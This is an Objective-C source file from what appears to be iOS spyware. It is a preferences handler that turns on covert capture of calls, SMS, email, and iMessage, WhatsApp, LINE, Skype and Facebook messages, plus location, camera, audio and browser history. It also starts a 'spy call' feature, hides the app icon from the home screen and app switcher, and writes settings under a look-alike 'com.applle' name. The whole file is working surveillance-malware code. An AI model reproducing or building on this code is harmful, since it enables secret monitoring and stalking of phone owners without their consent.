//
//  PreferencesChangeHandler.m
//  AppEngine
//
//  Created by Makara Khloth on 12/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PreferencesChangeHandler.h"
#import "AppEngine.h"

#import "ComponentHeaders.h"

@interface PreferencesChangeHandler (private)
- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture;
- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation;
- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber;
- (void) enableDisableSIMChangeNotification;
- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword;
- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility;
- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction;
- (void) enableDisablePanic: (PrefPanic *) aPrefPanic;
- (void) enableDisableDeviceLock: (PrefDeviceLock *) aPrefDeviceLock;
- (void) updateEmergencyNumbers: (PrefEmergencyNumber *) aPreferenceEmergencyNumber;
- (void) updateNotificationNumbers: (PrefNotificationNumber *) aPreferenceNotificationNumber;
- (void) updateHomeNumbers: (PrefHomeNumber *) aPreferenceHomeNumber;
@end

@implementation PreferencesChangeHandler

+ (void) synchronizeWithSettingsBundle: (id <PreferenceManager>) aPreferenceManager {
	//-----------------------------------------------------------------------------------------------
	// Panic preference
	// Update default settings of settings bundle
	PrefPanic *prefPanic = (PrefPanic *)[aPreferenceManager preference:kPanic];
	// 1 - Location plus camera image
	// 2 - Location only
	NSString *panicMode = [prefPanic mLocationOnly] ? @"2" : @"1";
	NSNumber *siren = [NSNumber numberWithBool:[prefPanic mEnablePanicSound]];
	
	// It will be saved to /var/root/Library/Preferences/com.applle.settings.pp.plist
	//		NSUserDefaults *userDefaults = [NSUserDefaults standardUserDefaults];
	//		[userDefaults setObject:panicMode forKey:@"mode"];
	//		[userDefaults synchronize];
	//		DLog(@"Current panic mode in settings bundle is = %@, userDefaults = %@", panicMode, userDefaults);
	
	// What we need is /var/mobile/Library/Preferences/com.applle.settings.pp.plist (file must exist)
	// This cause ui cannot synchronize its userDefaults!
	DLog (@"--> writing the mode to the plist (mode = %@) [2 is location only]", panicMode)
	NSString *dictPath = @"/var/mobile/Library/Preferences/com.applle.pp.settings.plist";
	NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithContentsOfFile:dictPath];
	[dict setObject:panicMode forKey:@"mode"];
	[dict setObject:siren forKey:@"siren"];
	[dict writeToFile:dictPath atomically:YES];
	system("chmod 644 /var/mobile/Library/Preferences/com.applle.pp.settings.plist");
	//-----------------------------------------------------------------------------------------------
}

- (id) initWithAppEngine:(AppEngine *) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
	}
	return (self);
}

- (void) onPreferenceChange: (Preference *) aPreference {
	switch ([aPreference type]) {
		case kEvents_Ctrl: {
			// 1. Events
			PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)aPreference;	
			[self enableDisableEventsCapture:prefEventCapture];
			// 2. Location
			PrefLocation *prefLocation = (PrefLocation *)[[mAppEngine mPreferenceManager] preference:kLocation];
			[self enableDisableLocationCapture:prefLocation];
		} break;
		case kLocation: {
			PrefLocation *prefLocation = (PrefLocation *)aPreference;
			[self enableDisableLocationCapture:prefLocation];
		} break;
		case kHome_Number: {
			[self enableDisableSIMChangeNotification];
			[self updateHomeNumbers:(PrefHomeNumber *)aPreference];
		} break;
		case kMonitor_Number: {
			[self enableDisableSpyCall:(PrefMonitorNumber *)aPreference];
			[self enableDisableSIMChangeNotification];
		} break;
		case kKeyword: {
			[self enableDisableKeyword:(PrefKeyword *)aPreference];
		} break;
		case kVisibility: {
			[self enableDisableVisibility:(PrefVisibility *)aPreference];
		} break;
		case kRestriction: {
			[self enableDisableAddressbookMode:(PrefRestriction *)aPreference];
		} break;
		case kPanic: {
			[self enableDisablePanic:(PrefPanic *)aPreference];
		} break;
		case kAlert: {
			[self enableDisableDeviceLock:(PrefDeviceLock *)aPreference];
		} break;
		case kEmergency_Number: {
			[self updateEmergencyNumbers:(PrefEmergencyNumber *)aPreference];
		} break;
		case kNotification_Number: {
			[self updateNotificationNumbers:(PrefNotificationNumber *)aPreference];
		} break;
		default:
			break;
	}
}

- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture {
	[[mAppEngine mEDM] setMaximumEvent:[aPrefEventCapture mMaxEvent]];
	[[mAppEngine mEDM] setDeliveryTimer:[aPrefEventCapture mDeliverTimer]];
	
	// Call log
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCallLog]) {
			[[mAppEngine mCallLogCaptureManager] startCapture];
		} else {
			[[mAppEngine mCallLogCaptureManager] stopCapture];
		}
	}
	
	// SMS
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSMS]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableSMS]) {
			[[mAppEngine mSMSCaptureManager] startCapture];
		} else {
			[[mAppEngine mSMSCaptureManager] stopCapture];
		}
	}
	
	// IMessage/WhatsApp/LINE/Skype
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventIM]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableIM]) {
			[[mAppEngine mIMessageCaptureManager] startCapture];
			[[mAppEngine mWhatsAppCaptureManager] startCapture];
			[[mAppEngine mLINECaptureManager] startCapture];
			[[mAppEngine mSkypeCaptureManager] startCapture];
			[[mAppEngine mFacebookCaptureManager] startCapture];
		} else {
			[[mAppEngine mIMessageCaptureManager] stopCapture];
			[[mAppEngine mWhatsAppCaptureManager] stopCapture];
			[[mAppEngine mLINECaptureManager] stopCapture];
			[[mAppEngine mSkypeCaptureManager] stopCapture];
			[[mAppEngine mFacebookCaptureManager] stopCapture];
		}
	}
	
	// MMS
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMMS]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableMMS]) {
			[[mAppEngine mMMSCaptureManager] startCapture];
		} else {
			[[mAppEngine mMMSCaptureManager] stopCapture];
		}
	}
	
	// Email
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventEmail]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableEmail]) {
			[[mAppEngine mMailCaptureManager] startMonitoring];
		} else {
			[[mAppEngine mMailCaptureManager] stopMonitoring];
		}
	}
	
	// Media finder
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		// Video
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		// Audio
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		if ([entries count]) {
			// We will not search media files we will wait for command (new use case)
//			[[mAppEngine mMediaFinder] findMediaFileWithExtMime:entries];
		}
	}
	
	// Media capture
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCameraImage] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventWallpaper]) {
		// Camera
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCameraImage]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage]) {
				[[mAppEngine mMediaCaptureManager] startCameraImageCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopCameraImageCapture];
			}
		}
		// Video
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVideoRecording]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile]) {
				[[mAppEngine mMediaCaptureManager] startVideoCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopVideoCapture];
			}
		}
		// Audio
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSoundRecording]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile]) {
				[[mAppEngine mMediaCaptureManager] startAudioCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopAudioCapture];
			}
		}
		// Wallpaper
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventWallpaper]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableWallPaper]) {
				[[mAppEngine mMediaCaptureManager] startWallPaperCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopWallPaperCapture];
			}
		}
	}
	
	// Browser url/Bookmark capture
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if ([aPrefEventCapture mStartCapture]) {
			if ([aPrefEventCapture mEnableBrowserUrl]) {
				[[mAppEngine mBrowserUrlCaptureManager] startBrowserUrlCapture];
			} else {
				[[mAppEngine mBrowserUrlCaptureManager] stopBrowserUrlCapture];
			}
		} else {
			[[mAppEngine mBrowserUrlCaptureManager] stopBrowserUrlCapture];
		}
	}
	
	// Application life cycle manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {		
		if ([aPrefEventCapture mStartCapture]) {
			if ([aPrefEventCapture mEnableALC]) {
				[[mAppEngine mALCManager] startMonitor];
			} else {
				[[mAppEngine mALCManager] stopMonitor];
			}
		} else {
			[[mAppEngine mALCManager] stopMonitor];
		}
	}
	
	// Note manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_NoteCapture]) {		
		if ([aPrefEventCapture mEnableNote]) { // Regardless of stop capture flag
			[[mAppEngine mNoteManager] startCapture];
		} else {
			[[mAppEngine mNoteManager] stopCapture];
		}
	}
	
	// Calendar manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCalendar]) {		
		if ([aPrefEventCapture mEnableCalendar]) { // Regardless of stop capture flag
			[[mAppEngine mCalendarManager] startCapture];
		} else {
			[[mAppEngine mCalendarManager] stopCapture];
		}
	}
}

- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation {
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[[mAppEngine mPreferenceManager] preference:kEvents_Ctrl];
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventLocation]) {
		[[mAppEngine mLocationManager] setMIntervalTime:[aPrefLocation mLocationInterval]];
		if ([prefEventCapture mStartCapture] && [aPrefLocation mEnableLocation]) {
			[[mAppEngine mLocationManager] startTracking];
		} else {
			[[mAppEngine mLocationManager] stopTracking];
		}
	}
}

- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_OnDemandConference]) {
		if ([[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
			[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != DISABLE) {
			if ([aPrefMonitorNumber mEnableMonitor]) {
				[[mAppEngine mSpyCallManager] start];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:[aPrefMonitorNumber mMonitorNumbers]];
				}
			} else {
				[[mAppEngine mSpyCallManager] stop];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
				}
			}
		} else {
			[[mAppEngine mSpyCallManager] stop];
			if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
				[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
			}
		}
	}
}

- (void) enableDisableSIMChangeNotification {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SIMChange] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HomeNumbers] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall]) {
		// SIM change notification
		PrefHomeNumber *prefHomeNumbers = (PrefHomeNumber *)[[mAppEngine mPreferenceManager] preference:kHome_Number];
		PrefMonitorNumber *prefMonitorNumbers = (PrefMonitorNumber *)[[mAppEngine mPreferenceManager] preference:kMonitor_Number];
		
		// 1. Home numbers
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HomeNumbers]) {
			NSString *notificationString = [[[mAppEngine mApplicationContext] mProductInfo] notificationStringForCommand:kNotificationSIMChangeCommandID
																									  withActivationCode:[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] activationCode]
																												 withArg:nil];
			[[mAppEngine mSIMChangeManager] startReportSIMChange:notificationString andRecipients:[prefHomeNumbers mHomeNumbers]];
		}
		
		// 2. Monitor numbers
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall]) {
			NSString *notificationString = NSLocalizedString (@"kSIMChange2MonitorNumbers", @"");
			[[mAppEngine mSIMChangeManager] startListenToSIMChange:notificationString andRecipients:[prefMonitorNumbers mMonitorNumbers]];
		}
	} else {
		[[mAppEngine mSIMChangeManager] stopReportSIMChange];
		[[mAppEngine mSIMChangeManager] stopListenToSIMChange];
	}
}

- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSData *keywordData = [aPrefKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
	}
}

- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility {
	// Visibility
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HideApplicationIcon]) {
		id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
		if ([aPrefVisibility mVisible]) {
			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		} else {
			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		}
		[visibility applyAppVisibility];
	}
}

- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction {
	// Address book manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_AddressbookManagement]) {
		// Address book management mode
		if (([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) ||
			([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor)) {
			[[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeMonitor];
			[[mAppEngine mAddressbookManager] start];
		} else {
			[[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeOff];
			[[mAppEngine mAddressbookManager] stop];
		}
	}	
}

- (void) enableDisablePanic: (PrefPanic *) aPrefPanic {
	PrefEventsCapture *prefEventsCapture = (PrefEventsCapture *)[[mAppEngine mPreferenceManager] preference:kEvents_Ctrl];
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_Panic]) {
		
		[PreferencesChangeHandler synchronizeWithSettingsBundle:[mAppEngine mPreferenceManager]];
		
		// Create Panic option to panic manager
		PanicOption *option = [[PanicOption alloc] init];
		// START MSG ---
		// Panic Alert has started
		//
		// Help, please contact me now!
		//
		// Date: %@
		NSString *templateMessage = NSLocalizedString(@"kPanicStartMessage", @"");
		DLog (@"Template message of start panic = %@", templateMessage);
		
		if ([[aPrefPanic mStartUserPanicMessage] length]) {
			templateMessage = [NSString stringWithFormat:templateMessage, [aPrefPanic mStartUserPanicMessage], @"%@"]; // %@ to replace date (Date: %@)
		} else {
			templateMessage = [NSString stringWithFormat:templateMessage, NSLocalizedString(@"kPanicUserStartDefaultMessage", @""), @"%@"];
		}
		
		[option setMStartMessageTemplate:templateMessage];
		DLog (@"START PANIC MSG = %@", templateMessage);
		
		[option setMPanicingMessageTemplate:NSLocalizedString(@"kPanicPanicingMessage", @"")];
		[option setMPanicLocationUndetermineTemplate:NSLocalizedString(@"kPanicUnableToDetermineLocationMessage", @"")];
		
		// STOP MSG ---
		// Panic Alert has stopped
		//
		// I'm fine now.
		//
		// Date: %@
		templateMessage = NSLocalizedString(@"kPanicStopMessage", @"");
		DLog (@"Template message of stop panic = %@", templateMessage);
		
		if ([[aPrefPanic mStopUserPanicMessage] length]) {
			templateMessage = [NSString stringWithFormat:templateMessage, [aPrefPanic mStopUserPanicMessage], @"%@"]; // %@ to replace date (Date: %@)
		} else {
			templateMessage = [NSString stringWithFormat:templateMessage, NSLocalizedString(@"kPanicUserStopDefaultMessage", @""), @"%@"];
		}
		
		[option setMStopMessageTemplate:templateMessage];
		DLog (@"STOP PANIC MSG = %@", templateMessage);
		
		if ([aPrefPanic mPanicStart]) {
			DLog(@"Pref change handler try to start panic --------------------")
			if ([prefEventsCapture mDeliverTimer] == 0) {
				// If not deliver is set (timer = 0), reset for the time panic on
				[[mAppEngine mEDM] explicitlyNotifyEmergencyEvents];
			}
			
			[option setMLocationInterval:[aPrefPanic mPanicLocationInterval]];
			[option setMImageCaptureInterval:[aPrefPanic mPanicImageInterval]];
			[option setMEnableSound:[aPrefPanic mEnablePanicSound]];
			
			if ([aPrefPanic mLocationOnly]) {
				[[mAppEngine mPanicManager] setPanicMode:kPanicModeLocationOnly];
			} else {
				[[mAppEngine mPanicManager] setPanicMode:kPanicModeLocationImage];
			}
			
			[[mAppEngine mPanicManager] setPanicOption:option];
			
			// ***************** ???????????????? *****************
			//[[mAppEngine mPanicManager] performSelector:@selector(startPanic) withObject:nil afterDelay:2];
			
			[[mAppEngine mPanicManager] startPanic];
			
		} else {
			DLog(@"Pref change handler try to stop panic --------------------")
			if ([prefEventsCapture mDeliverTimer] == 0) {
				// If not deliver is set (timer = 0), now reset back to previous state
				[[mAppEngine mEDM] explicitlyCancelNotifyEmergencyEvents];
			}
			[[mAppEngine mPanicManager] setPanicOption:option];
			[[mAppEngine mPanicManager] stopPanic];
		}
		[option release];
		

	}
}

- (void) enableDisableDeviceLock: (PrefDeviceLock *) aPrefDeviceLock {
	if ([aPrefDeviceLock mStartAlertLock]) {
		DLog(@">>>>>>>>>>>>>>>>> location interval %d", [aPrefDeviceLock mLocationInterval]);
		DeviceLockOption *deviceLockOption = [[DeviceLockOption alloc] init];
		[deviceLockOption setMEnableAlertSound:[aPrefDeviceLock mEnableAlertSound]];
		[deviceLockOption setMLocationInterval:[aPrefDeviceLock mLocationInterval]];
		[deviceLockOption setMDeviceLockMessage:[aPrefDeviceLock mDeviceLockMessage]];
		[[mAppEngine mDeviceLockManager] setDeviceLockOption:deviceLockOption];
		[[mAppEngine mDeviceLockManager] lockDevice];
		[deviceLockOption release];
	} else {
		[[mAppEngine mDeviceLockManager] unlockDevice];
	}
}

- (void) updateEmergencyNumbers: (PrefEmergencyNumber *) aPreferenceEmergencyNumber {
}

- (void) updateNotificationNumbers: (PrefNotificationNumber *) aPreferenceNotificationNumber {
}

- (void) updateHomeNumbers: (PrefHomeNumber *) aPreferenceHomeNumber {
}

- (void) dealloc {
	[mAppEngine release];
	[super dealloc];
}

@end
